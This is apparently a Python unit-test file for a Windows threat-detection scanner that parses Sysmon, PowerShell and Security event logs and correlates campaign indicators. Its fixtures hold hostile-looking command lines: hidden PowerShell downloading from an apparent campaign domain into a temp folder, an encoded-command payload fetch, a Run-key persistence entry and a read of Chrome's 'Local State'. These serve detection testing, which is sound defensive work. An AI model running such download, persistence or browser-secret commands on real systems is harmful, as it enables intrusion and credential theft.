import subprocess
import unittest
from unittest.mock import patch
from xml.sax.saxutils import escape

from guardian.eventlogs import parse_event_log_output, parse_event_log_output_with_status
from guardian.indicators import KNOWN_SAMPLE_ARTIFACTS
from guardian.scanner import ScanEngine
from guardian import windows


NS = "http://schemas.microsoft.com/win/2004/08/events/event"


def event(event_id: int, record_id: int, data: dict[str, str], *, channel: str = "Microsoft-Windows-Sysmon/Operational", provider: str = "Microsoft-Windows-Sysmon", timestamp: str = "2026-11-21T16:00:00.000Z") -> str:
    fields = "".join(f'<Data Name="{escape(key)}">{escape(value)}</Data>' for key, value in data.items())
    return (
        f'<Event xmlns="{NS}"><System><Provider Name="{escape(provider)}"/><EventID>{event_id}</EventID>'
        f'<EventRecordID>{record_id}</EventRecordID><Channel>{escape(channel)}</Channel>'
        f'<TimeCreated SystemTime="{timestamp}"/><Execution ProcessID="900"/></System>'
        f'<EventData>{fields}</EventData></Event>'
    )


EMPTY = (True, "<Events />", "")


class RelatedBehaviorTelemetryTests(unittest.TestCase):
    def _scan_with_outputs(self, outputs, *, limit=2000):
        calls = list(outputs)
        engine = ScanEngine(enabled_stages={"eventlogs"}, event_log_record_limit=limit)
        with patch("guardian.scanner.windows.IS_WINDOWS", True), patch(
            "guardian.scanner.windows.query_event_log", side_effect=calls
        ) as query:
            engine._scan_eventlogs()
        engine.mock_query = query
        return engine

    def _empty_channels(self, sysmon=EMPTY, security=EMPTY, powershell=EMPTY, tasks=EMPTY, wmi=EMPTY):
        return [sysmon, security, powershell, tasks, wmi]

    def test_processaccess_target_name_alone_is_not_attributed_to_tctc(self):

        xml = "<Events>" + event(10, 100, {
            "SourceProcessGUID": "{11111111-1111-1111-1111-111111111111}", "SourceProcessId": "1234",
            "SourceImage": r"C:\Program Files\Example\example.exe", "TargetProcessGUID": "{22222222-2222-2222-2222-222222222222}",
            "TargetProcessId": "456", "TargetImage": r"C:\Windows\System32\explorer.exe", "GrantedAccess": "0x1fffff",
        }) + "</Events>"
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, xml, "")))
        self.assertEqual(engine.findings, [])
    def test_processaccess_is_campaign_linked_only_after_processguid_image_pid_ioc_and_write_rights_join(self):
        source_guid = "{11111111-1111-1111-1111-111111111111}"
        create = event(1, 99, {
            "ProcessGuid": source_guid, "ProcessId": "1234", "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": "powershell.exe -WindowStyle Hidden Invoke-WebRequest https://benderoflight.com/nfront.php",
            "ParentProcessGuid": "{aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa}", "ParentProcessId": "400",
            "Hashes": "SHA256=" + "a" * 64,
        })
        access = event(10, 100, {
            "SourceProcessGUID": source_guid, "SourceProcessId": "1234",
            "SourceImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "TargetProcessGUID": "{22222222-2222-2222-2222-222222222222}",
            "TargetProcessId": "456", "TargetImage": r"C:\Windows\System32\explorer.exe",
            "GrantedAccess": "0x1fffff",
        })
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, f"<Events>{create}{access}</Events>", "")))
        linked = [f for f in engine.findings if f.category == "Correlated ProcessAccess"]
        self.assertEqual(len(linked), 1)
        self.assertEqual(linked[0].severity, "High")
        self.assertTrue(linked[0].metadata["source_guid_joined"])
        self.assertTrue(linked[0].metadata["source_guid_pid_match"])
        self.assertEqual(linked[0].metadata["source_pid"], "1234")
        self.assertEqual(linked[0].metadata["target_pid"], "456")

    def test_processaccess_read_only_rights_do_not_create_campaign_alert(self):
        source_guid = "{11111111-1111-1111-1111-111111111111}"
        create = event(1, 99, {
            "ProcessGuid": source_guid, "ProcessId": "1234", "Image": r"C:\Windows\System32\powershell.exe",
            "CommandLine": "Invoke-WebRequest https://benderoflight.com/nfront.php",
        })
        access = event(10, 100, {
            "SourceProcessGUID": source_guid, "SourceProcessId": "1234", "SourceImage": r"C:\Windows\System32\powershell.exe",
            "TargetProcessId": "456", "TargetImage": r"C:\Windows\System32\explorer.exe", "GrantedAccess": "0x0010",
        })
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, f"<Events>{create}{access}</Events>", "")))
        self.assertFalse(any(f.category == "Correlated ProcessAccess" for f in engine.findings))
        self.assertEqual(len(engine.findings), 1)  # process-create IOC only

    def test_processaccess_pid_or_image_mismatch_is_context_only(self):

        guid = "{11111111-1111-1111-1111-111111111111}"
        create = event(1, 1, {"ProcessGuid": guid, "ProcessId": "1234", "Image": r"C:\Windows\System32\powershell.exe", "CommandLine": "https://benderoflight.com/nfront.php"})
        access = event(10, 2, {"SourceProcessGUID": guid, "SourceProcessId": "9999", "SourceImage": r"C:\Windows\System32\powershell.exe", "TargetImage": r"C:\Windows\explorer.exe", "GrantedAccess": "0x1fffff"})
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, f"<Events>{create}{access}</Events>", "")))
        self.assertFalse(any(f.category in {"Correlated ProcessAccess", "Cross-process access context"} for f in engine.findings))
    def test_processaccess_missing_source_identity_is_never_attributed(self):

        guid = "{11111111-1111-1111-1111-111111111111}"
        create = event(1, 1, {"ProcessGuid": guid, "ProcessId": "1234", "Image": r"C:\Windows\System32\powershell.exe", "CommandLine": "Invoke-WebRequest https://benderoflight.com/nfront.php"})
        access = event(10, 2, {"SourceProcessGUID": guid, "TargetProcessId": "456", "TargetImage": r"C:\Windows\explorer.exe", "GrantedAccess": "0x1fffff"})
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, f"<Events>{create}{access}</Events>", "")))
        self.assertFalse(any(f.category in {"Correlated ProcessAccess", "Cross-process access context"} for f in engine.findings))
    def test_processaccess_descendant_lineage_is_medium_not_direct_high(self):
        parent_guid = "{aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa}"
        child_guid = "{bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb}"
        parent = event(1, 1, {
            "ProcessGuid": parent_guid, "ProcessId": "1000", "Image": r"C:\Windows\System32\powershell.exe",
            "CommandLine": "Invoke-WebRequest https://benderoflight.com/nfront.php",
        })
        child = event(1, 2, {
            "ProcessGuid": child_guid, "ParentProcessGuid": parent_guid, "ProcessId": "1001",
            "ParentProcessId": "1000", "ParentImage": r"C:\Windows\System32\powershell.exe",
            "Image": r"C:\Windows\System32\cmd.exe", "CommandLine": "cmd.exe /c whoami",
        })
        access = event(10, 3, {
            "SourceProcessGUID": child_guid, "SourceProcessId": "1001",
            "SourceImage": r"C:\Windows\System32\cmd.exe", "TargetProcessId": "456",
            "TargetImage": r"C:\Windows\explorer.exe", "GrantedAccess": "0x1fffff",
        })
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, f"<Events>{parent}{child}{access}</Events>", "")))
        linked = [f for f in engine.findings if f.category == "Correlated ProcessAccess"]
        self.assertEqual(len(linked), 1)
        self.assertEqual(linked[0].severity, "Medium")
        self.assertEqual(linked[0].confidence, "Medium")
        self.assertTrue(linked[0].metadata["source_guid_joined"])

    def test_temp_local_parent_path_alone_does_not_attribute_child_processaccess(self):
        parent_guid = "{aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa}"
        child_guid = "{bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb}"
        parent = event(1, 1, {
            "ProcessGuid": parent_guid, "ProcessId": "1000", "Image": r"C:\Windows\System32\cmd.exe",
            "CommandLine": r"cmd.exe /c C:\Users\Public\AppData\Local\Temp\Local\something.bat",
        })
        child = event(1, 2, {
            "ProcessGuid": child_guid, "ParentProcessGuid": parent_guid, "ProcessId": "1001",
            "ParentProcessId": "1000", "ParentImage": r"C:\Windows\System32\cmd.exe",
            "Image": r"C:\Windows\System32\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden",
        })
        access = event(10, 3, {
            "SourceProcessGUID": child_guid, "SourceProcessId": "1001",
            "SourceImage": r"C:\Windows\System32\powershell.exe", "TargetProcessId": "456",
            "TargetImage": r"C:\Windows\explorer.exe", "GrantedAccess": "0x1fffff",
        })
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, f"<Events>{parent}{child}{access}</Events>", "")))
        self.assertFalse(any(f.category == "Correlated ProcessAccess" for f in engine.findings))

    def test_powerShell_4104_history_is_scanned_and_not_called_amsi(self):
        ps = event(4104, 400, {
            "ScriptBlockText": r"Invoke-WebRequest https://benderoflight.com/nfront.php -OutFile $env:TEMP\Local\Z797.ps1",
            "ScriptBlockId": "{script-block-id}", "Path": "ConsoleHost",
        }, channel="Microsoft-Windows-PowerShell/Operational", provider="Microsoft-Windows-PowerShell")
        engine = self._scan_with_outputs(self._empty_channels(powershell=(True, f"<Events>{ps}</Events>", "")))
        finding = next(f for f in engine.findings if f.category == "PowerShell Script Block / Module telemetry")
        self.assertEqual(finding.severity, "High")
        self.assertFalse(finding.metadata["amsi_result"])
        self.assertIn("Script Block (4104)", "\n".join(finding.evidence))
        self.assertFalse(finding.metadata["source_image"].startswith("powershell.exe"))

    def test_powerShell_4103_module_history_is_scanned_separately_from_4104(self):
        ps = event(4103, 401, {
            "ContextInfo": r"Host Application = powershell.exe; Command = Invoke-WebRequest https://benderoflight.com/nfront.php -OutFile $env:TEMP\Local\Z797.ps1",
            "Payload": r"Invoke-WebRequest https://benderoflight.com/nfront.php",
        }, channel="Microsoft-Windows-PowerShell/Operational", provider="Microsoft-Windows-PowerShell")
        engine = self._scan_with_outputs(self._empty_channels(powershell=(True, f"<Events>{ps}</Events>", "")))
        finding = next(f for f in engine.findings if f.category == "PowerShell Script Block / Module telemetry")
        self.assertEqual(finding.metadata["event_id"], "4103")
        self.assertFalse(finding.metadata["amsi_result"])
        self.assertIn("Module (4103)", "\n".join(finding.evidence))

    def test_default_historical_eventlog_limit_is_five_thousand_per_channel(self):
        self.assertEqual(ScanEngine(enabled_stages={"eventlogs"}).event_log_record_limit, 5000)

    def test_legacy_text_telemetry_remains_readable_but_processaccess_is_context_only(self):

        sysmon = r"""Event[0]:
        Event ID: 1
        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        CommandLine: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand abc; Invoke-WebRequest http://392073480/payload
        ProcessId: 501
        Event[1]:
        Event ID: 7
        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        ImageLoaded: C:\Windows\System32\msi.dll
        Event[2]:
        Event ID: 10
        SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        TargetImage: C:\Windows\System32\RuntimeBroker.exe
        GrantedAccess: 0x1fffff
        Event[3]:
        Event ID: 11
        TargetFilename: C:\Users\Demo\AppData\Local\Temp\Local\ifwf.e4
        Event[4]:
        Provider: EDR telemetry
        ApiName: TpAllocWork / TrySubmitThreadpoolCallback
        """
        security = r"""Event[0]:
        Event ID: 4663
        ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        ObjectName: C:\Users\Demo\AppData\Local\Google\Chrome\User Data\Local State
        """
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, sysmon, ""), security=(True, security, "")))
        self.assertEqual(engine.findings, [])
    def test_limit_detects_truncation_and_reports_returned_vs_inspected_counts(self):
        records = "<Events>" + "".join(event(1, i, {"Image": r"C:\Windows\System32\notepad.exe"}) for i in range(101)) + "</Events>"
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, records, "")), limit=100)
        self.assertTrue(engine.telemetry_coverage["Sysmon"]["truncated"])
        self.assertEqual(engine.telemetry_coverage["Sysmon"]["records_inspected"], 100)
        self.assertEqual(engine.telemetry_coverage["Sysmon"]["records_returned"], 101)
        self.assertTrue(engine._stage_warning)

    def test_missing_sysmon_channel_is_explicitly_unavailable(self):
        events = []
        engine = ScanEngine(event_callback=events.append, enabled_stages={"eventlogs"})
        missing = (False, "", "Failed to open event query.\nThe specified channel could not be found.")
        outputs = self._empty_channels(sysmon=missing)
        with patch("guardian.scanner.windows.IS_WINDOWS", True), patch("guardian.scanner.windows.query_event_log", side_effect=outputs):
            engine._scan_eventlogs()
        self.assertEqual(engine.telemetry_coverage["Sysmon"]["status"], "unavailable")
        self.assertTrue(any(e.get("level") == "WARNING" and "Sysmon historical channel" in e.get("message", "") for e in events if e.get("type") == "log"))

    def test_no_matching_events_is_reported_as_successful_empty_query(self):
        outputs = self._empty_channels(sysmon=(False, "", "No events were found that match the specified selection criteria."))
        engine = self._scan_with_outputs(outputs)
        self.assertEqual(engine.telemetry_coverage["Sysmon"]["status"], "read")
        self.assertEqual(engine.telemetry_coverage["Sysmon"]["records_inspected"], 0)
        self.assertIn("no matching events", engine.telemetry_coverage["Sysmon"]["reason"].lower())

    def test_malformed_xml_is_not_reported_as_a_successful_channel_read(self):
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, "<Events><Event><System>", "")))
        self.assertEqual(engine.telemetry_coverage["Sysmon"]["status"], "parse_error")
        self.assertEqual(engine.telemetry_coverage["Sysmon"]["records_inspected"], 0)
        self.assertTrue(engine._stage_warning)

    def test_sysmon_event22_dns_ioc_is_captured_with_correct_source_fields(self):
        dns = event(22, 22, {
            "ProcessGuid": "{33333333-3333-3333-3333-333333333333}", "ProcessId": "4321",
            "Image": r"C:\Windows\System32\svchost.exe", "QueryName": "benderoflight.com.",
            "QueryResults": "type: A, 93.94.52.29", "QueryStatus": "0",
        })
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, f"<Events>{dns}</Events>", "")))
        matches = [f for f in engine.findings if f.category == "Campaign network / DNS telemetry"]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].metadata["matched_domains"], ["benderoflight.com"])
        self.assertEqual(matches[0].metadata["source_pid"], "4321")
        self.assertIn("SHA-256: Not provided", "\n".join(matches[0].evidence))

    def test_registry_autorun_event_requires_indicator_or_correlated_actor(self):
        benign = event(13, 12, {
            "Image": r"C:\Windows\System32\reg.exe", "ProcessGuid": "{44444444-4444-4444-4444-444444444444}",
            "ProcessId": "222", "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Teams",
            "Details": r"C:\Program Files\Teams\Teams.exe",
        })
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, f"<Events>{benign}</Events>", "")))
        self.assertFalse(any(f.category == "Registry persistence telemetry" for f in engine.findings))

        suspicious = event(13, 13, {
            "Image": r"C:\Windows\System32\reg.exe", "ProcessGuid": "{44444444-4444-4444-4444-444444444444}",
            "ProcessId": "222", "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Update",
            "Details": "powershell.exe -File https://benderoflight.com/nfront.php",
        })
        engine = self._scan_with_outputs(self._empty_channels(sysmon=(True, f"<Events>{suspicious}</Events>", "")))
        self.assertEqual(len([f for f in engine.findings if f.category == "Registry persistence telemetry"]), 1)

    def test_task_scheduler_history_uses_indicators_not_task_names_alone(self):
        task = event(106, 14, {"TaskName": "\\Microsoft\\Windows\\Update", "UserContext": "SYSTEM"},
                     channel="Microsoft-Windows-TaskScheduler/Operational", provider="Microsoft-Windows-TaskScheduler")
        engine = self._scan_with_outputs(self._empty_channels(tasks=(True, f"<Events>{task}</Events>", "")))
        self.assertFalse(any("Task Scheduler historical telemetry" in f.category for f in engine.findings))

    def test_eventlog_parser_returns_named_fields_and_metadata(self):
        xml = "<Events>" + event(10, 23, {"SourceImage": r"C:\a.exe", "TargetImage": r"C:\b.exe"}) + "</Events>"
        parsed = parse_event_log_output(xml)
        self.assertEqual(len(parsed), 1)
        self.assertEqual(parsed[0]["event_id"], "10")
        self.assertEqual(parsed[0]["record_id"], "23")
        self.assertEqual(parsed[0]["data"]["SourceImage"], r"C:\a.exe")

    def test_eventlog_parser_distinguishes_empty_and_malformed_xml(self):
        self.assertEqual(parse_event_log_output_with_status("<Events />"), ([], "xml"))
        self.assertEqual(parse_event_log_output_with_status("<Events><Event><System>"), ([], "parse_error"))
        legacy, status = parse_event_log_output_with_status("Event[0]:\nEvent ID: 10\nTargetImage: explorer.exe")
        self.assertEqual(status, "legacy_text")
        self.assertEqual(legacy[0]["event_id"], "10")

    def test_windows_event_query_requests_xml_and_decodes_utf16(self):
        xml = "<Events />".encode("utf-16")
        completed = subprocess.CompletedProcess(args=[], returncode=0, stdout=xml, stderr=b"")
        with patch("guardian.windows.IS_WINDOWS", True), patch("guardian.windows.subprocess.run", return_value=completed) as run:
            ok, out, error = windows.query_event_log("Microsoft-Windows-Sysmon/Operational", "*[System[(EventID=1)]]", count=1001)
        self.assertTrue(ok)
        self.assertEqual(error, "")
        self.assertEqual(out.strip(), "<Events />")
        args = run.call_args.args[0]
        self.assertIn("/f:xml", args)
        self.assertIn("/c:1001", args)

    def test_sysmon_query_includes_registry_rename_and_does_not_enable_blocking(self):
        engine = self._scan_with_outputs(self._empty_channels())
        query = engine.mock_query.call_args_list[0].args[1]
        self.assertIn("EventID=14", query)
        self.assertNotIn("FileBlockExecutable", query)


if __name__ == "__main__":
    unittest.main()
